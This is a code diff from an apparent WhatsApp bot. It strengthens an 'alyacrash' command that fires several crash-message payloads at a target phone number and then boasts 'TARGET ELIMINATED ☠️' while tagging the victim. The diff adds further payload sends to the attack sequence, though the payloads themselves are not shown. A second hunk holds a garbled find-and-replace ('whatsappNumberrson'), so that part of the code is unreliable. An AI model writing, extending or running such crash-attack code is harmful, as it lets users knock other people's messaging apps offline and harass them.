@@ -8330,7 +8330,7 @@ let teman = pickRandom(xeonverifieduser)
 setTimeout(() => {
 }, 1000)
 setTimeout(() => {
-replygcalya('Managed to Get One Person')
+replygcalya('Managed to Get One whatsappNumberrson')
 }, 5000)
 setTimeout(() => {
 AlyaBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
@@ -21097,12 +21097,11 @@ case "alyacrash": {
         await bakdok(whatsappNumber, Alyabug);
          // Random delay between 2 
         await sendPaymentInfoMessage(whatsappNumber, Alyabug);
-
-        await penghitaman(whatsappNumber, painbug);;
-
+        await penghitaman(whatsappNumber, painbug);
         await iponcrash(whatsappNumber, force);
-
         await sendSystemCrashMessage(whatsappNumber, force);
+        await sendPaymentInfoMessage(whatsappNumber, painbug);
+        await ngeloc(whatsappNumber, force2);
 
          if (j === 1) {
             // Additional logic if needed
@@ -21111,7 +21110,7 @@ case "alyacrash": {
   replygcalya(
         "TARGET ELIMINATED ☠️ @" +
         whatsappNumber.split("@")[0] +
-        " Using *" +
+        " Using " +
         command +
         "👑ALYA IS SUPREME 👑",
         [whatsappNumber]
